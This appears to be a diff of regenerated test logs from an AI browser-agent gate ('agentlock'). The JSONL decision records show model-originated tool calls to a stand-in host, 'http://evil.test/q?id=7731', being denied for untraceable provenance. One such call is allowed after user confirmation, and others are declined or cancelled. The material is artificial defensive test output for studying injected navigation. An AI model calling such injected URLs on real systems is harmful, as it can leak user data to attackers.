@@ -23,7 +23,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-4d6d00b4",
+    "audit_id": "agentlock-2026-08-26-22edd88b",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -32,7 +32,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_ed22d423918dacdb5638a01a",
+    "receipt_id": "rcpt_3e5e1c34e6b33af44cf695eb",
     "target": ""
   },
   "ok": true,
@@ -47,7 +47,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-31a05ec5",
+    "audit_id": "agentlock-2026-08-26-0098e094",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -56,7 +56,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_f147a4ff1a9ee8a86a862af8",
+    "receipt_id": "rcpt_5c21fb951e85786e74863cfa",
     "target": ""
   },
   "ok": true,
@@ -81,9 +81,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-4d6d00b4", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:06Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_ed22d423918dacdb5638a01a", "role": "operator", "signature": "dc15600c7ce22c632013eed5ae41bcb211f31a1387d625d19fa0e529c14c95a9", "signing_key_id": "agentlock-browser", "timestamp": 1787404026.3697608, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404026.3698814, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-5eafc958", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:06Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_edbe6c11caa5ab920924f64f", "role": "operator", "signature": "6b3dec925961a33a5b9d5ba0a318bf54bbd642d7e3945182e702e6cd52ef9c4f", "signing_key_id": "agentlock-browser", "timestamp": 1787404026.4210818, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404026.4211698, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-31a05ec5", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18ce227df0f1a383", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:06Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_f147a4ff1a9ee8a86a862af8", "role": "operator", "signature": "3cd71e1484ae8df7c864781821ed06e217e435c8bc8b81460e103392704efb08", "signing_key_id": "agentlock-browser", "timestamp": 1787404026.4240482, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404026.4240901, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-22edd88b", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:26Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_3e5e1c34e6b33af44cf695eb", "role": "operator", "signature": "a29506cfc3ccb23ec8808d49876bd8fb38319bbfb89d2544eaa97535accd0717", "signing_key_id": "agentlock-browser", "timestamp": 1787758106.986233, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758106.9863532, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-273c2d8f", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:27Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_9c1373865ac4cead6e76882d", "role": "operator", "signature": "54a7fa983a070eb7ecc970b165f67db24ece2f478d8736475f534e1b0172c55e", "signing_key_id": "agentlock-browser", "timestamp": 1787758107.0399067, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758107.0399702, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-0098e094", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18cf6486c2736c81", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:27Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_5c21fb951e85786e74863cfa", "role": "operator", "signature": "bdb986654eed7f25cc02cfea24425fc2197c94598098c95c50cd116593e5a2b2", "signing_key_id": "agentlock-browser", "timestamp": 1787758107.041849, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758107.0419028, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -104,7 +104,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-0403b35c",
+    "audit_id": "agentlock-2026-08-26-093562de",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -113,7 +113,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_f24ff27b0400fd1a4c660966",
+    "receipt_id": "rcpt_fd133792ff190e28334a803f",
     "target": ""
   },
   "ok": true,
@@ -128,7 +128,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-46a17561",
+    "audit_id": "agentlock-2026-08-26-57fa46f9",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -137,7 +137,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_a02815968dc6980924339a67",
+    "receipt_id": "rcpt_63cf1266f9b4edd27cc27371",
     "target": ""
   },
   "ok": false,
@@ -152,7 +152,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-0d9e9cd5",
+    "audit_id": "agentlock-2026-08-26-4bc77ebd",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -161,7 +161,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_fc665719f4cec11baba6c7df",
+    "receipt_id": "rcpt_06b7de4f5ebd315365552159",
     "target": ""
   },
   "ok": false,
@@ -186,11 +186,11 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-0403b35c", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:07Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_f24ff27b0400fd1a4c660966", "role": "operator", "signature": "cc68ab6d4120dbf48edcb8f8839f12c5e193b0caf0e98dcee010f040a7ff5d43", "signing_key_id": "agentlock-browser", "timestamp": 1787404027.7087712, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404027.70884, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-46a17561", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:07Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a02815968dc6980924339a67", "role": "operator", "signature": "b08c3c233aecac4a5394d58a477cbf7ab9d4cdd706b3826048becf0f709c17df", "signing_key_id": "agentlock-browser", "timestamp": 1787404027.7336335, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404027.7337072, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-46a17561", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce227e3f2d0a3f", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:07Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a02815968dc6980924339a67", "role": "operator", "signature": "b08c3c233aecac4a5394d58a477cbf7ab9d4cdd706b3826048becf0f709c17df", "signing_key_id": "agentlock-browser", "timestamp": 1787404027.7336335, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404027.7351704, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-0d9e9cd5", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:07Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_fc665719f4cec11baba6c7df", "role": "operator", "signature": "c0a65ce2d06148057d3a5f9a58e8c998b4e399f1679be80e8456f09239cba230", "signing_key_id": "agentlock-browser", "timestamp": 1787404027.7380445, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404027.7381005, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-0d9e9cd5", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:07Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_fc665719f4cec11baba6c7df", "role": "operator", "signature": "c0a65ce2d06148057d3a5f9a58e8c998b4e399f1679be80e8456f09239cba230", "signing_key_id": "agentlock-browser", "timestamp": 1787404027.7380445, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404027.7382293, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-093562de", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:28Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_fd133792ff190e28334a803f", "role": "operator", "signature": "7d799203da307d695e5dfcb720fdd0be208c190926a9a0d62fbdce768d14c847", "signing_key_id": "agentlock-browser", "timestamp": 1787758108.5098703, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758108.5099657, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-57fa46f9", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:28Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_63cf1266f9b4edd27cc27371", "role": "operator", "signature": "90cbdb2f36837e52146264b88103005e8649b7eddd294ccf0f6262f4750bb8d0", "signing_key_id": "agentlock-browser", "timestamp": 1787758108.5359278, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758108.5360723, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-57fa46f9", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf64871ba063ad", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:28Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_63cf1266f9b4edd27cc27371", "role": "operator", "signature": "90cbdb2f36837e52146264b88103005e8649b7eddd294ccf0f6262f4750bb8d0", "signing_key_id": "agentlock-browser", "timestamp": 1787758108.5359278, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758108.537653, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-4bc77ebd", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:28Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_06b7de4f5ebd315365552159", "role": "operator", "signature": "8967d8c34efb9d9379c3d0fff56c50cdd21dab92b3001943b9d888c5a74f0bc8", "signing_key_id": "agentlock-browser", "timestamp": 1787758108.541309, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758108.5413542, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-4bc77ebd", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:28Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_06b7de4f5ebd315365552159", "role": "operator", "signature": "8967d8c34efb9d9379c3d0fff56c50cdd21dab92b3001943b9d888c5a74f0bc8", "signing_key_id": "agentlock-browser", "timestamp": 1787758108.541309, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758108.541474, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -211,7 +211,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-bce979e5",
+    "audit_id": "agentlock-2026-08-26-0c6b0bfb",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -220,7 +220,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_a3dee8167b40a1c838c6adb5",
+    "receipt_id": "rcpt_6b453c694768bc81766ae8a6",
     "target": ""
   },
   "ok": true,
@@ -235,7 +235,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-9d4b3c89",
+    "audit_id": "agentlock-2026-08-26-dfc0a984",
     "channel": "MODEL",
     "confirmation": "cancelled",
     "decided_by": "agentlock_gate",
@@ -244,7 +244,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_a62a4eec92993897b7b34446",
+    "receipt_id": "rcpt_c490a901b6237d6fe12e0f2a",
     "target": ""
   },
   "ok": false,
@@ -259,7 +259,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-c9d3eee9",
+    "audit_id": "agentlock-2026-08-26-57d30b15",
     "channel": "MODEL",
     "confirmation": "cancelled",
     "decided_by": "agentlock_gate",
@@ -268,7 +268,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_995243b2549726baf727dfd8",
+    "receipt_id": "rcpt_f0e14a0838ac284ef025e585",
     "target": ""
   },
   "ok": false,
@@ -294,11 +294,11 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-bce979e5", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:09Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_a3dee8167b40a1c838c6adb5", "role": "operator", "signature": "42f44cd22bf09dafb72fc6877dc3ac73e8a011aecf44eb102b7b25bb04bff6fa", "signing_key_id": "agentlock-browser", "timestamp": 1787404029.2151296, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404029.2151966, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-9d4b3c89", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:09Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a62a4eec92993897b7b34446", "role": "operator", "signature": "e3801756cfaa4c1c1416ae6ea073308ac2e1cfabc0c85f77747ff7c2cae6d7f8", "signing_key_id": "agentlock-browser", "timestamp": 1787404029.2399087, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404029.240028, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-9d4b3c89", "cause": "tool", "channel": "MODEL", "confirmation": "cancelled", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce227e98f6cc0c", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:09Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a62a4eec92993897b7b34446", "role": "operator", "signature": "e3801756cfaa4c1c1416ae6ea073308ac2e1cfabc0c85f77747ff7c2cae6d7f8", "signing_key_id": "agentlock-browser", "timestamp": 1787404029.2399087, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404029.2416353, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-c9d3eee9", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:09Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_995243b2549726baf727dfd8", "role": "operator", "signature": "912dd7698b6c17dccca1631b65897db2aa5fd99a197fc7927aa0cd929bd09c47", "signing_key_id": "agentlock-browser", "timestamp": 1787404029.243946, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404029.2439885, "value": "http://evil.test/q?id=7731"}
